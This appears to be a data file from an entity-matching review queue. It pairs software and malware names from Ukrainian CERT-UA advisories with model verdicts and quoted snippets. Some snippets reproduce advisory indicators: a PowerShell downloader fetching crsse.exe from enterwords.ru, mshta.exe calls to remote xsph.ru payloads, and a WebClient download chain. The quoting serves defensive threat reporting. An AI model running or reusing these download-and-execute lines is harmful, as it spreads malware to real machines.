queue	label	relation	direction	suggested	ensemble	agreement	claudeVerdict	gptVerdict	geminiVerdict	rule	source	category	left	right	stratum	mechanism	sim	canonical	snippet	llmRationale	evidence
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Log4Shell	Log4j	c	embedding	0.6512		left: [doc 1751036] …855, CVE-2021-26858, CVE-2021-26857, CVE-2021-27065 (ProxyLogon) Fortinet: CVE-2018-13379 Apache Log4j: CVE-2021-44228 (Log4Shell) Нагадуємо, що відповідно до законодавства (стаття 9 Закону України «Про захист інформації в інформаційно-комунікаційни… ‖ right: [doc 18101] …ованих систем. Водночас не відкидаються ще два можливих вектори атаки, а саме – експлуатація вразливостей OctoberCMS та Log4j. Урядова команда реагування на комп’ютерні надзвичайні події України CERT-UA вжила заходів зі збору цифрових доказів, в…	Log4Shell is the nickname of the vulnerability CVE-2021-44228, not the Log4j library itself.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	GammaSteel.PS1	z.ps1	c	embedding	0.6507		left: [doc 1229152] …я файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.… ‖ right: [doc 39934] …й ISO-файл містить документ-приманку "a.docx", LNK-файл "УКАЗ ПРЕЗИДЕНТА УКРАЇНИ №151_2022.mp4.lnk", PowerShell-скрипт "z.ps1" та EXE-файл "b.exe". У випадку запуску LNK-файлу, останній виконає PowerShell-скрипт, який, у свою чергу, відкриє DOCX…	GammaSteel.PS1 and z.ps1 are distinct PowerShell scripts with different filenames and roles.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	installer.exe	portable.exe	c	embedding	0.6506		left: [doc 10011] …для віддаленого доступу (RAT). Мал.5 «Електронний запит.ехе» В свою чергу «Електронний запит.ехе» містить в собі файли «installer.exe» та «host_news_mod_mod.msi». Файл «installer.exe» є старою версією легального програмного забезпечення для віддаленого… ‖ right: [doc 4555802] …ipt-файл "pax_2023_AB1058..js", який, використовуючи PowerShell, забезпечить завантаження та запуск виконуваного файлу "portable.exe". Останній, у свою чергу, здійснить запуск шкідливої програми SmokeLoader (дата компіляції: 2023-04-24 11:45:17).	Different executables used in different campaigns.	
5	different			different		rule-only				differing-digits	embedding	Software	Microsoft Windows Server 2003	Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1	c	embedding	0.6505		left: [doc 2661] …і. Вразливі версії ОС Windows: Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems S… ‖ right: [doc 2661] …Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microso…		
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	ms-msdt.exe	mshta.exe	c	embedding	0.6503		left: [doc 40559] …луатації вразливостей CVE-2021-40444 та CVE-2022-30190, призведе до запуску PowerShell-команди, завантаження EXE-файлу "ms-msdt.exe" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon. ‖ right: [doc 40240] …://a0667987.xsph[.]ru/preparations/rejection.xml hXXps://icanhazip[.]com (Легітимний сервіс) Хостові: %WINDIR%\System32\mshta.exe http://a0671524.xsph.ru/bandage/precarious.xml /f %WINDIR%\System32\mshta.exe http://a0667987.xsph.ru/preparations/reje…	Two distinct binaries.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Apple Mail	Microsoft Outlook	c	embedding	0.6502		left: [doc 2723] …проведення атаки EFAIL. Direct exfiltration Атака за допомогою експлуатації вразливостей в поштових клієнтах, таких як Apple Mail, iOS Mail та Mozilla Thunderbird і т.д. Для реалізації атаки зловмисникам потрібно змінити певним чином зашифрований ли… ‖ right: [doc 3028] …та отримувати облікові дані, що використовуються в різних програмах системи (наприклад Google Chrome, Mozilla Firefox, Microsoft Outlook, IceDragon, FILEZILLA, тощо). З’явився Agent Tesla в 2014 році і виконував функції кейлогера та викрадача паролів. Дане…	Different mail clients from different vendors.	
5	different			different	different	unanimous	different	different	different	differing-digits	embedding	Software	Microsoft Windows 7 for 32-bit Systems SP1	Microsoft Windows Server 2008 for Itanium-based Systems SP2	c	embedding	0.6497		left: [doc 2661] …овлювати програми, видаляти та змінювати дані, або створювати нових користувачів в системі. Вразливі версії ОС Windows: Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itaniu… ‖ right: [doc 2661] …ems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Microsoft Windows Server 2008 for x64-based Systems SP2 Microsoft Windows XP Рекомендації: 1. Якщо ви користуєтесь одні…	Two separate Windows editions listed side by side as distinct vulnerable products.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	ms-msdt.exe	mstsc.exe	c	embedding	0.6491		left: [doc 40559] …луатації вразливостей CVE-2021-40444 та CVE-2022-30190, призведе до запуску PowerShell-команди, завантаження EXE-файлу "ms-msdt.exe" та ураження комп'ютера шкідливою програмою Cobalt Strike Beacon. ‖ right: [doc 6281076] …ми (створення виключень) налаштування міжмережевого екрану для обмеження можливості встановлення RDP-з'єднань програмою mstsc.exe до ресурсів в мережі Інтернет налаштування групових політик (адміністративного шаблону) для заборони перенаправлення ре…	Distinct executables (MSDT vs Remote Desktop client).	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Remote Desktop Protocol (RDP)	rdp.exe	c	embedding	0.6485		left: — ‖ right: [doc 6281123] …apit.exe [METASPLOIT] f389247be7524e2d4afc98f6811622fe e3a3abf8c80637445bab387be288b6475992b6b556cb55a5a8c366401fb864c5 rdp.exe 981943d2e7ec0ab3834c639f49cc4b42 6bbf2b86e023f132416f40690b0386bd00e00cf3e1bef725dec92df7f1cd1007 id_rsa d26920b81f4e6b…	RDP is a protocol/feature while rdp.exe is a specific attacker-deployed file with its own hashes.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Iridium Browser	Uran Browser	c	embedding	0.6481		left: [doc 3028] …отримати облікові та конфігураційні дані, зокрема, з такого програмного забезпечення (список не повний): Yandex Browser Iridium Browser Epic Privacy Browser Chromium Browser 7Star Browser Torch Browser ChromePlus Browser Kometa Browser Amigo Browser Brave… ‖ right: [doc 3028] …migo Browser Brave Browser CentBrowser Liebao Browser Elements Browser Vivaldi Browser Citrio Browser 360Chrome Browser Uran Browser Chedot Browser Orbitum Browser Sputnik Browser Comodo Dragon Browser CocCoc Browser QIP Surf Browser Coowon Browser Ope…	Two distinct browsers enumerated separately in the same list.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	VMRC для Mac	клієнти VMware Horizon для Mac	c	embedding	0.6481		left: [doc 2496] …3958, CVE-2020-3959) в VMware ESXi, VMware Workstation Pro / Player (Workstation), VMware Fusion Pro / Fusion (Fusion), VMRC для Mac, клієнтів VMware Horizon для Mac. Зловмисник може скористатися цими вразливостями, щоб здійснити ескалацію своїх привіл… ‖ right: —	VMRC for Mac and VMware Horizon clients for Mac are listed as separate affected products.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	VMware ESXi	VMware Tools	c	embedding	0.6477		left: [doc 2496] …are також було опубліковано оновлення безпеки для усунення вразливостей (CVE-2020-3957, CVE-2020-3958, CVE-2020-3959) в VMware ESXi, VMware Workstation Pro / Player (Workstation), VMware Fusion Pro / Fusion (Fusion), VMRC для Mac, клієнтів VMware Hori… ‖ right: [doc 16] …PSB20-03 Adobe Experience Manager APSB20-01 VMware також було опубліковано оновлення безпеки для усунення вразливості в VMware Tools. Зловмисник може скористатися цією вразливістю, щоб взяти під контроль систему, яка має дану вразливість. Ознайомтесь з…	ESXi hypervisor and VMware Tools are separate products with separate advisories.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	IcloudSecurity.lnk	icloud.cmd	c	embedding	0.6476		left: [doc 2807] …db509d71 https://www.virustotal.com/#/file/b024234d583b3adb5ae4ec3809d316b4f2f48839b3d9baec615750f35ce231cc/detection ./IcloudSecurity.lnk MD5: 355b8b3170f01c5db98461b7451008d6 https://www.virustotal.com/#/file/cce68c4b705595610289293922b96513d71d8b376f6e9fe… ‖ right: [doc 2807] …178/detection ./НПУ.docx MD5: 23577b4223db2762bc4521dcc8c9e5c5 /Iclouding.exe MD5: 834c709455bfefb9b0e8976bad13a8f4 . ./icloud.cmd MD5: 9d03d5fb154b1cb54da8a6ab71999251 ./iclouds.cmd MD5: 1d4874db97fcce7c3537f49ec8aa0672 Рекомендації CERT-UA: - реком…	IcloudSecurity.lnk and icloud.cmd are different files (a LNK shortcut vs a CMD script).	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Filezilla	WinSCP	c	embedding	0.6469		left: [doc 2806] …ролів, має функціонал для збору збережених паролів в браузерах, поштових клієнтах (Outlook, Thunderbird), FTP клієнтах (Filezilla, WinSCP), інформацію про криптогаманці. Також, може збирати інформацію про файлову систему, запущені процеси, викрадати… ‖ right: [doc 2806] …функціонал для збору збережених паролів в браузерах, поштових клієнтах (Outlook, Thunderbird), FTP клієнтах (Filezilla, WinSCP), інформацію про криптогаманці. Також, може збирати інформацію про файлову систему, запущені процеси, викрадати листува…	FileZilla and WinSCP are different FTP client applications.	
5	different			different		rule-only				differing-digits	embedding	Software	DROWN (CVE-2016-0800)	Heartbleed (CVE-2014-0160)	c	embedding	0.6466				
5	different			different		rule-only				differing-digits	embedding	Software	CVE-2023-43770	WinRAR CVE-2023-38831	c	embedding	0.6465		left: [doc 6281123] …ент (CERT-UA#10859), пов'язаний із розповсюдженням електронних листів, що містили експлойт для вразливості в Roundcube (CVE-2023-43770), успішне спрацювання якого створювало технічні можливості для викрадення автентифікаційних даних користувача, а також… ‖ right: [doc 6281681] …игляді подвійних архівів з LNK або HTA файлами. При цьому, деякі архіви можуть містити експлойт для відомої вразливості WinRAR CVE-2023-38831. У випадку успішної компрометації, на ЕОМ здійснюється запуск програми LONEPAGE, що реалізує функціонал виконання коман…		
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	cmd.exe	one.exe	c	embedding	0.6462		left: [doc 2707] …файли. Блокуйте на Proxy нетипові User Agent. Виконуйте основні правила кібергігієни . Cхема: email attach (lzh) > js > cmd.exe > powershell.exe > (new-object system.net.webclient).downloadfile > %Temp%ckZ89.ExE Індикатори компрометації (IOC): Шкі… ‖ right: [doc 37704] …ко 60МБ. З'ясовано, що згаданий файл забезпечить виконання завантажувача "alt.exe", який здійснить завантаження файлів "one.exe" та "dropper.exe" з сервісу Discord та їхній запуск. В рамках дослідження визначено, що запуск "one.exe" призведе до ур…	Windows command interpreter versus a downloaded malicious payload file.	
5	different			different		rule-only				differing-digits	embedding	Software	DROWN (CVE-2016-0800)	FREAK (CVE-2015-0204)	c	embedding	0.6461				
5	different			different		rule-only				differing-digits	embedding	Software	Logjam (CVE-2015-4000)	POODLE (CVE-2014-3566)	c	embedding	0.6461				
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Chromium Browser	Citrio Browser	c	embedding	0.6451		left: [doc 3028] …ані, зокрема, з такого програмного забезпечення (список не повний): Yandex Browser Iridium Browser Epic Privacy Browser Chromium Browser 7Star Browser Torch Browser ChromePlus Browser Kometa Browser Amigo Browser Brave Browser CentBrowser Liebao Browser El… ‖ right: [doc 3028] …romePlus Browser Kometa Browser Amigo Browser Brave Browser CentBrowser Liebao Browser Elements Browser Vivaldi Browser Citrio Browser 360Chrome Browser Uran Browser Chedot Browser Orbitum Browser Sputnik Browser Comodo Dragon Browser CocCoc Browser QIP…	Two separately enumerated browsers in the same credential-theft list.	
5	different			different		rule-only				differing-digits	embedding	Software	TRYxaEbX_2.ps1	init.ps1	c	embedding	0.6445		left: [doc 619229] …6ce24c71 TRYxaEbX.ps1 f4217387333f65faeb7b13637c1e7c72 e1cbfef74b4084023a1f02ab68b3ad3bc60561f7e988860b80ac94a91922fa86 TRYxaEbX_2.ps1 26e326ba69f5258c4979902b5bd4f24e 9dec13e1b0ed9337fcbe233d5f83eff09c64a14c7f2400b9b915a685b29612ea shellcode.x86 (Cobalt… ‖ right: [doc 6281701] …-приманки "ArmyPlus.exe", містить файли інтерпретатору Python, архів з файлами програми Tor, а також PowerShell-скрипт "init.ps1". У випадку відкриття файлу "ArmyPlusInstaller-v.0.10.23722.exe" буде здійснено запуск файлу-приманки, а також PowerShe…		
5	different			different		rule-only				differing-digits	embedding	Software	Browser.ps1	stage2.ps1	c	embedding	0.6444		left: [doc 6281123] …оманда забезпечить завантаження і запуск HTA-файлу "browser.hta" (очистить вміст буферу обміну) та PowerShell-сценарію "Browser.ps1", основним призначенням якого є: завантаження і запуск SSH для побудови тунелю викрадення та ексфільтрацію автентифікац… ‖ right: [doc 703548] …80644ca22a stage1.ps1 6cac251512ecd9f0627cf0da5d0a0ff7 e390d3d9004124616a18d10dc5b9f6eeab6b01bd167fac4d783036af574a4278 stage2.ps1 a3cf45b6206bedee45c45b6ccdc8be98 2ed48e578a522a4e718510572056c5cd86d11bdf7e71a52c68a55ebb823771da shellcode.x86.bin (Co…		
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	inject.exe	one.exe	c	embedding	0.6441		left: [doc 38155] …В результаті комп'ютер буде уражено шкідливою програмою Cobalt Strike Beacon. Зауважимо, що дата компіляції інжектору "inject.exe" - 15.03.2022 Виявлену активність, виходячи зі специфічності VBScript-коду, з середнім рівнем впевненості асоційовано з… ‖ right: [doc 37704] …ко 60МБ. З'ясовано, що згаданий файл забезпечить виконання завантажувача "alt.exe", який здійснить завантаження файлів "one.exe" та "dropper.exe" з сервісу Discord та їхній запуск. В рамках дослідження визначено, що запуск "one.exe" призведе до ур…	Distinct executables from distinct incidents.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	GammaLoad.PS1	GammaSteel.PS1	c	embedding	0.6438		left: [doc 39138] …HTA-файлу, який містить VBScript-код, що, у свою чергу, забезпечить завантаження і запуск powershell-скрипта "get.php" (GammaLoad.PS1). Завданням останнього є визначення унікального ідентифікатору комп'ютера (на основі імені комп'ютера та серійного номе… ‖ right: [doc 1229152] …я файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.…	Loader and stealer components of the same toolset are sibling malware, not one entity.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Mozilla Firefox	Mozilla Thunderbird	c	embedding	0.6434		left: [doc 3028] …робити скріншоти та отримувати облікові дані, що використовуються в різних програмах системи (наприклад Google Chrome, Mozilla Firefox, Microsoft Outlook, IceDragon, FILEZILLA, тощо). З’явився Agent Tesla в 2014 році і виконував функції кейлогера та викр… ‖ right: [doc 2723] …Direct exfiltration Атака за допомогою експлуатації вразливостей в поштових клієнтах, таких як Apple Mail, iOS Mail та Mozilla Thunderbird і т.д. Для реалізації атаки зловмисникам потрібно змінити певним чином зашифрований лист та переслати його жертві. Післ…	Firefox (browser) and Thunderbird (mail client) are distinct Mozilla products.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	cmd.exe	wscript.exe	c	embedding	0.6432		left: [doc 2707] …файли. Блокуйте на Proxy нетипові User Agent. Виконуйте основні правила кібергігієни . Cхема: email attach (lzh) > js > cmd.exe > powershell.exe > (new-object system.net.webclient).downloadfile > %Temp%ckZ89.ExE Індикатори компрометації (IOC): Шкі… ‖ right: [doc 18419] …powershell.exe "%USERPROFILE%\Documents\.exe" 3 powershell.exe <IP-адреса>:443 22 powershell.exe cdn.discordapp[.]com 1 wscript.exe powershell.exe "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe" [NeT.seRvIcepOiNtmanAgER]::sECURITyPROToCO…	Two different Windows programs.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	OUTSTEEL	STEELHOOK	c	embedding	0.6427		left: [doc 13156] …ідження інциденту встановлено, що з фейкового веб-сайту здійснюється розповсюдження шкідливого програмного забезпечення OUTSTEEL, призначеного для пошуку та ексфільтрації документів. · Використання подібних тактик, технік та процедур, об'єктів атак… ‖ right: [doc 6276894] …З використанням MASEPIE на комп'ютер довантажується та запускається OPENSSH (для побудови тонелю), PowerShell-сценарцій STEELHOOK (викрадення даних Інтернет-браузерів Chrome/Edge), а також бекдор OCEANMAP. Крім того, протягом години з моменту первин…	Distinct malware families used by different clusters despite the shared 'STEEL' string.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Firefox	Opera Browser	c	embedding	0.6425		left: [doc 2496] …ьні оновлення безпеки для своїх продуктів. Mozilla випустила оновлення безпеки для усунення вразливостей в Thunderbird, Firefox ESR та Firefox, а також на Firefox для операційної системи iOS. Зловмисник може скористатися деякими з цих вразливостей… ‖ right: [doc 3028] …ser Chedot Browser Orbitum Browser Sputnik Browser Comodo Dragon Browser CocCoc Browser QIP Surf Browser Coowon Browser Opera Browser Google Chrome Mozilla Firefox Thunderbird Claws Mail Postbox Credential Outlook Foxmail Opera Mail Pocomail Becky! Open…	Firefox and Opera are different browsers listed separately.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Chrome	Chromium Browser	c	embedding	0.6423		left: [doc 2496] Mozilla, VMWare, Apple, Chrome та Cisco випустили оновлення безпеки ‖ right: [doc 3028] …ані, зокрема, з такого програмного забезпечення (список не повний): Yandex Browser Iridium Browser Epic Privacy Browser Chromium Browser 7Star Browser Torch Browser ChromePlus Browser Kometa Browser Amigo Browser Brave Browser CentBrowser Liebao Browser El…	Chromium Browser is a separate browser from Google Chrome and is listed apart from it.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	crsse.exe	csrss.zip	c	embedding	0.642		left: [doc 2727] …w-Object -ComObjectADODB.Stream; $path = $env:temp + '\1964.exe'; $http_request.open('GET', 'http://enterwords.ru/uadoc/crsse.exe', $false); $http_request.send();if($http_request.Status -eq"200") {$adodb.open();$adodb.type = 1;$adodb.write($http_req… ‖ right: [doc 38088] …крайне опасно!!!.zip 989c5de8ce5ca07cc2903098031c7134 8dd8b9bd94de1e72f0c400c5f32dcefc114cc0a5bf14b74ba6edc19fd4aeb2a5 csrss.zip 7d20fa01a703afa8907e50417d27b0a4 3b2e708eaa4744c76a633391cf2c983f4a098b46436525619e5ea44e105355fe cpcrs.exe (DoubleZero…	Different filenames and file types from unrelated cases.	
5	different			different		rule-only				differing-digits	embedding	Software	Microsoft Windows Server 2008 R2 for x64-based Systems SP1	Windows Server 2012	c	embedding	0.6417		left: [doc 2661] …for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems SP1 Microsoft Windows Server 2008 for 32-bit Systems SP2 Microsoft Windows Server 2008 for Itanium-based Systems SP2 Micros… ‖ right: [doc 2625] …леного робочого столу (RDP, стосується всіх підтримуваних версій Windows, включаючи Server) та RDP Gateway Server (є на Windows Server 2012, 2016, 2019) дозволяють виконувати віддалене виконання коду. Вразливості сервера не вимагають аутентифікації або взаємо…		
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Loader.dll	core.dll	c	embedding	0.6414		left: [doc 6280159] …eea55 spreadsheet.xls 1cc4bdaa3ef0f00a71bf74fb9c320694 d0dccd3a46392875b480c3666e2da62d12fdb0b4e5557185d4116344ed73110d Loader.dll 07feb6b34198e1a8aec598e8dca8f42e 912e8f6d71d556c6def42cb01e8c17e7bd6e46bd3f90eba0c8e8f83937d362f0 ResetEngine.dll 235dd… ‖ right: [doc 37626] …станнього призведе до створення на комп'ютері і запуску дропера "ignit.vbs", який забезпечить декодування .NET-лоадеру "core.dll", а також файлів "desktop.ini" (виконує запуск "core.dll" за допомогою regasm.exe) і "Windows Prefetch.lNk", який забез…	Distinct DLL artifacts with different hashes/incidents.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	PowerShell (powershell.exe)	Windows Script Host (wscript.exe)	c	embedding	0.6414		left: [doc 1229152] …пейлоадів використовуються заплановані завдання, гілка реєстру Run, а також змінні середовища. Активно використовується PowerShell (powershell.exe), а також wscript.exe, mshta.exe. Індикатори компрометації Файли: 136bd98383e5b3e06b63f2d7c72a3d4d 81d8c20a19e1c2c3e5bfd… ‖ right: —	PowerShell and Windows Script Host are distinct interpreters, listed separately.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	LOADGRIP	LOADJUMP	c	embedding	0.6409		left: [doc 6278706] …ESEED (KNUCKLETOUCH, ICYWELL, WRONGSENS, KAPEKA), виявлено новий інструментарій зловмисників, а саме, шкідливі програми LOADGRIP та BIASBOAT (Linux-варіант QUEUESEED), які було встановлено на ЕОМ (ОС Linux), що призначені для автоматизації процесів… ‖ right: [doc 13156] …ій», на комп'ютер жертви буде завантажено файл “756285df0c8b81cf14ad3463a57d33ed.xll”(рис. 2), що є шкідливою програмою LOADJUMP, дата компіляції: 11.07.2021 (рис. 3)., Рис. 2 Завантаження файлу “756285df0c8b81cf14ad3463a57d33ed.xll” Рис. 3 Декодов…	Different malware programs reported in different incidents.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	cmd.exe	cscript.exe	c	embedding	0.6406		left: [doc 2707] …файли. Блокуйте на Proxy нетипові User Agent. Виконуйте основні правила кібергігієни . Cхема: email attach (lzh) > js > cmd.exe > powershell.exe > (new-object system.net.webclient).downloadfile > %Temp%ckZ89.ExE Індикатори компрометації (IOC): Шкі… ‖ right: [doc 4697016] …я облікових записів користувачів обмежити можливіть виконання "mshta.exe", запуску Windows Script Host ("wscript.exe", "cscript.exe") та інтерпретатору Python. Індикатори кіберзагроз Файли: 36379daf7ee88e10a395958cacf6f7c0 fdc59293e2ed95e72e11d627c733…	Two different Windows binaries.	
5	different			different		rule-only				differing-digits	embedding	Software	Microsoft Windows Server 2003	Windows Server 2012	c	embedding	0.64		left: [doc 2661] …і. Вразливі версії ОС Windows: Microsoft Windows 7 for 32-bit Systems SP1 Microsoft Windows 7 for x64-based Systems SP1 Microsoft Windows Server 2003 Microsoft Windows Server 2008 R2 for Itanium-based Systems SP1 Microsoft Windows Server 2008 R2 for x64-based Systems S… ‖ right: [doc 2625] …леного робочого столу (RDP, стосується всіх підтримуваних версій Windows, включаючи Server) та RDP Gateway Server (є на Windows Server 2012, 2016, 2019) дозволяють виконувати віддалене виконання коду. Вразливості сервера не вимагають аутентифікації або взаємо…		
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Microsoft Exchange Server	Microsoft Outlook	c	embedding	0.6394		left: [doc 2724] …rosoft Windows Microsoft Office and Microsoft Office Services and Web Apps ChakraCore Adobe Flash Player .NET Framework Microsoft Exchange Server Windows Host Compute Service Shim Найбільш небезпечною вразливістю є CVE-2018-8174 або «Double Kill». https://portal.ms… ‖ right: [doc 3028] …та отримувати облікові дані, що використовуються в різних програмах системи (наприклад Google Chrome, Mozilla Firefox, Microsoft Outlook, IceDragon, FILEZILLA, тощо). З’явився Agent Tesla в 2014 році і виконував функції кейлогера та викрадача паролів. Дане…	Mail server product versus mail client application.	
5	different			different		rule-only				differing-digits	embedding	Software	CVE-2024-38213	WinRAR CVE-2023-38831	c	embedding	0.6392		left: [doc 6282517] …о, передбачали відправку жертві PDF-документу з посиланням, відвідування якого, у поєднанні з експлуатацією вразливості CVE-2024-38213, призводило до завантаження на комп'ютер LNK-файлу (розширення "pdf.lnk"), запуск якого призводив до виконання PowerShe… ‖ right: [doc 6281681] …игляді подвійних архівів з LNK або HTA файлами. При цьому, деякі архіви можуть містити експлойт для відомої вразливості WinRAR CVE-2023-38831. У випадку успішної компрометації, на ЕОМ здійснюється запуск програми LONEPAGE, що реалізує функціонал виконання коман…		
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Microsoft Exchange Server 2019	Microsoft Office 2019	c	embedding	0.6392		left: [doc 11113] …t Exchange Server 2013 (< 15.00.1497.012) Microsoft Exchange Server 2016 (CU18 < 15.01.2106.013, CU19 < 15.01.2176.009) Microsoft Exchange Server 2019 (CU8 < 15.02.0792.010) Компанія Microsoft повідомила, що на час випуску оновлень, вразливості вже активно використовува… ‖ right: [doc 4279195] …що первинна компрометація ЕОМ відбулася 19.01.2023 в результаті встановлення неліцензійної версії програмного продукту Microsoft Office 2019, BitTorrent-файл для завантаження якого ("Microsoft.Office-x64.v2019.x.iso.torrent", MD5: f2b0c6b3e7794d3f3d3b2bba5709c…	Different Microsoft products sharing only a year designation.	
5	different			different		rule-only				differing-digits	embedding	Software	CVE-2022-23131	WinRAR CVE-2023-38831	c	embedding	0.6389		left: [doc 37287] Вразливості в Zabbix (CVE-2022-23131, CVE-2022-23134) ‖ right: [doc 6281681] …игляді подвійних архівів з LNK або HTA файлами. При цьому, деякі архіви можуть містити експлойт для відомої вразливості WinRAR CVE-2023-38831. У випадку успішної компрометації, на ЕОМ здійснюється запуск програми LONEPAGE, що реалізує функціонал виконання коман…		
5	different			different		rule-only				differing-digits	embedding	Software	GammaLoad.PS1_v2	GammaSteel.PS1	c	embedding	0.6389		left: [doc 40240] Кібератаки групи UAC-0010 (Armageddon) з використанням шкідливої програми GammaLoad.PS1_v2 (CERT-UA#4634,4648) ‖ right: [doc 1229152] …я файлів за визначеним переліком розширень, а також автентифікаційних даних Інтернет-браузерів, для чого застосовується GammaSteel.PS1 та GammaSteel.NET, відповідно. Вірогідно, GammaSteel.PS1 є PowerShell-реалізацією раніше використовуваного HarvesterX.…		
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	Agent Tesla	MerlinAgent	c	embedding	0.6388		left: [doc 3028] Agent Tesla (шкідливе програмне забезпечення) ‖ right: [doc 5391805] MerlinAgent: новий open-source інструмент для здійснення кібератак у відношенні державних організацій України (CERT-UA#6995, CERT-U…	Unrelated malware/tooling families.	
5	different			review	different	unanimous	different	different	different	embedding-neighbour	embedding	Software	vbc.exe	wscript.exe	c	embedding	0.6388		left: [doc 37688] …Індикатори компрометації: Файли: 93feeeab72617e4f5630fd79f2fdd4b6 лист підтримки.xlsx 95d60664267d442e99c41e2aa3baff68 vbc.exe 5a2c58b9ad136ecaea903e47ca7d0727 formbook.exe (Formbook) Мережеві: mariya@posish[.]club 104[.]168.247.233 hxxp://103[.]… ‖ right: [doc 18419] …powershell.exe "%USERPROFILE%\Documents\.exe" 3 powershell.exe <IP-адреса>:443 22 powershell.exe cdn.discordapp[.]com 1 wscript.exe powershell.exe "%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe" [NeT.seRvIcepOiNtmanAgER]::sECURITyPROToCO…	Distinct executables.	
